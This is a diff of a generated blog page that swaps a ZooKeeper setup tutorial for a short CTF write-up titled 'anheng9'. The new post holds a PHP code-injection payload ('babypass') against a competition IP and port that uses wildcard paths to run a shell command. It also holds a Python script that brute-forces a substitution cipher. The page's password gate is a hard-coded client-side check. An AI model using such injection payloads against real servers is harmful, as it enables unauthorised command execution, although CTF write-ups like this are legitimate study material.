@@ -11,16 +11,16 @@
     <meta name="author" content="Tianji">
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="Tianji">
-    <meta name="keywords" content="zookeeper安装-启动 | Tianji">
+    <meta name="keywords" content="anheng9 | Tianji">
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>zookeeper安装-启动 · Tianji&#39;s Blog</title>
+    <title>anheng9 · Tianji&#39;s Blog</title>
     <!-- 设置密码 -->
     <script>
         (function(){
-            if(''){
-                if (prompt('请输入文章密码','') !== ''){
+            if('anheng'){
+                if (prompt('请输入文章密码','') !== 'anheng'){
                     alert('密码错误！');
                     history.back();
                 }
@@ -221,7 +221,7 @@
                 <a href="/">Tianji&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">zookeeper安装-启动</a>
+                <a href="#" class="post-name">anheng9</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            zookeeper安装-启动
+            anheng9
             <!-- 404 -->
             
         </h1>
@@ -259,20 +259,14 @@
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="zookeeper">zookeeper</a>
-    
-</div>
-                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">704</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">128</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/09/20</span>
+                    <span class="post-intro-time">2018/09/22</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,49 +390,20 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="单机模式"><a href="#单机模式" class="headerlink" title="单机模式"></a>单机模式</h2><ul>
-<li>下载，并解压zookeeper</li>
-</ul>
-<blockquote>
-<p>wget <a href="http://mirrors.hust.edu.cn/apache/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gz" rel="external nofollow" target="_blank">http://mirrors.hust.edu.cn/apache/zookeeper/zookeeper-3.4.13/zookeeper-3.4.13.tar.gz</a></p>
-</blockquote>
-<ul>
-<li>创建data和logs两个目录,用于存储数据和日志</li>
-</ul>
-<blockquote>
-<p>ht@TIANJI:/mnt/d/zookeeper\$ cd zookeeper-3.4.13/<br>ht@TIANJI:/mnt/d/zookeeper/zookeeper-3.4.13\$ mkdir data<br>ht@TIANJI:/mnt/d/zookeeper/zookeeper-3.4.13\$ mkdir logs</p>
-</blockquote>
-<ul>
-<li>在<code>conf</code>目录下写入zoo.cfg文件</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tickTime=2000</span><br><span class="line">dataDir=/mnt/d/zookeeper/zookeeper-3.4.13/data</span><br><span class="line">dataLogDir=/mnt/d/zookeeper/zookeeper-3.4.13/logs</span><br><span class="line">clientPort=2181</span><br></pre></td></tr></table></figure>
-<ul>
-<li>进入bin目录，启动、停止、重启分和查看当前节点状态（包括集群中是何角色）别执行：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">./zkServer.sh start</span><br><span class="line">./zkServer.sh stop</span><br><span class="line">./zkServer.sh restart</span><br><span class="line">./zkServer.sh status</span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">./zkServer.cmd</span><br></pre></td></tr></table></figure>
-<h2 id="伪集群模式"><a href="#伪集群模式" class="headerlink" title="伪集群模式"></a>伪集群模式</h2><p>同时在每一个dataDir目录下，创建myid文件，文件内容即服务器ID，具体如下:</p>
-<p>server.A=B:C:D     其中 A 是一个数字，就是myid里的那个数字，表示这个是第几号服务器；B 是这个服务器的 ip 地址,C和D是两个端口,C、D两个端口相互也不能重复（仅限伪分布式模式下）。</p>
-<p>官方解释如下:</p>
-<p><strong>表单server.X的条目列出构成ZooKeeper服务的服务器。当服务器启动时，它通过查找数据目录中的文件myid来知道它是哪个服务器 。该文件包含服务器编号，以ASCII格式显示。</strong></p>
-<p><strong>最后，请注意每个服务器名称后面的两个端口号：“2888”和“3888”。对等体使用前端口连接到其他对等体。这样的连接是必要的，使得对等体可以进行通信，例如，以商定更新的顺序。更具体地说，一个ZooKeeper服务器使用这个端口来连接追随者到领导者。当新的领导者出现时，追随者使用此端口打开与领导者的TCP连接。因为默认领导选举也使用TCP，所以我们目前需要另外一个端口进行领导选举。这是服务器条目中的第二个端口。</strong></p>
-<p>复制三个zookeeper文件夹。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/d/zookeeper$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── zookeeper_1</span><br><span class="line">├── zookeeper_2</span><br><span class="line">├── zookeeper_3</span><br><span class="line">└── zookeeper-3.4.13.tar.gz</span><br></pre></td></tr></table></figure>
-<p>修改配置文件:</p>
-<p>zookeeper_1/zoo.cfg:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tickTime=2000</span><br><span class="line">initLimit=10</span><br><span class="line">syncLimit=5</span><br><span class="line">dataDir=/mnt/d/zookeeper/zookeeper_1/data</span><br><span class="line">clientPort=2182</span><br><span class="line">dataLogDir=/mnt/d/zookeeper/zookeeper_1/logs</span><br><span class="line"></span><br><span class="line">server.1=localhost:2287:3387</span><br><span class="line">server.2=localhost:2288:3388</span><br><span class="line">server.3=localhost:2289:3389</span><br></pre></td></tr></table></figure>
-<p>zookeeper_2/zoo.cfg:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tickTime=2000</span><br><span class="line">initLimit=10</span><br><span class="line">syncLimit=5</span><br><span class="line">dataDir=/mnt/d/zookeeper/zookeeper_2/data</span><br><span class="line">clientPort=2182</span><br><span class="line">dataLogDir=/mnt/d/zookeeper/zookeeper_2/logs</span><br><span class="line"></span><br><span class="line">server.1=localhost:2287:3387</span><br><span class="line">server.2=localhost:2288:3388</span><br><span class="line">server.3=localhost:2289:3389</span><br></pre></td></tr></table></figure>
-<p>zookeeper_3/zoo.cfg:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tickTime=2000</span><br><span class="line">initLimit=10</span><br><span class="line">syncLimit=5</span><br><span class="line">dataDir=/mnt/d/zookeeper/zookeeper_3/data</span><br><span class="line">clientPort=2182</span><br><span class="line">dataLogDir=/mnt/d/zookeeper/zookeeper_3/logs</span><br><span class="line"></span><br><span class="line">server.1=localhost:2287:3387</span><br><span class="line">server.2=localhost:2288:3388</span><br><span class="line">server.3=localhost:2289:3389</span><br></pre></td></tr></table></figure>
-<p>然后，挨个启动即可。</p>
+        <h2 id="babypass"><a href="#babypass" class="headerlink" title="babypass"></a>babypass</h2><p>payload: <code>http://101.71.29.5:10014/?code=?&gt;&lt;?=</code>/???/??? /*<code>?&gt;</code></p>
+<h2 id="go-md5你找到的字符串"><a href="#go-md5你找到的字符串" class="headerlink" title="go(md5你找到的字符串)"></a>go(md5你找到的字符串)</h2><p>见识太短，google也没找到。悲剧。</p>
+<p>ciphertext.txt:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilnllliiikkninlekile</span><br></pre></td></tr></table></figure>
+<p>解密脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ilnllliiikkninlekile"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'ilnke'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">''</span>.join(i))</span><br><span class="line"><span class="keyword">for</span> now_key <span class="keyword">in</span> key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = int(solve_c[i])*<span class="number">5</span>+int(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"now_ascii:"</span>, now_ascii, chr(now_ascii)</span><br><span class="line">        <span class="keyword">if</span> now_ascii &gt; ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii += <span class="number">1</span></span><br><span class="line">        res += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> now_key,res</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
-            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/28842/">https://www.tiandiwuji.top/posts/28842/</a>
-            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/28842/">September 20th 2018, 12:23:57 pm</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/45708/">https://www.tiandiwuji.top/posts/45708/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/45708/">September 22nd 2018, 9:37:18 am</a>
             </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -446,17 +411,12 @@
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/posts/62824/" title="dubbo项目结构">
-                    <div class="nextTitle">dubbo项目结构</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/posts/11234/" title="dubbo-启动">
-                    <div class="prevTitle">dubbo-启动</div>
+                <a href="/posts/37116/" title="汇编指令大全">
+                    <div class="prevTitle">汇编指令大全</div>
                 </a>
             
         </li>
@@ -569,7 +529,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#单机模式"><span class="toc-number">1.</span> <span class="toc-text">单机模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪集群模式"><span class="toc-number">2.</span> <span class="toc-text">伪集群模式</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babypass"><span class="toc-number">1.</span> <span class="toc-text">babypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-md5你找到的字符串"><span class="toc-number">2.</span> <span class="toc-text">go(md5你找到的字符串)</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
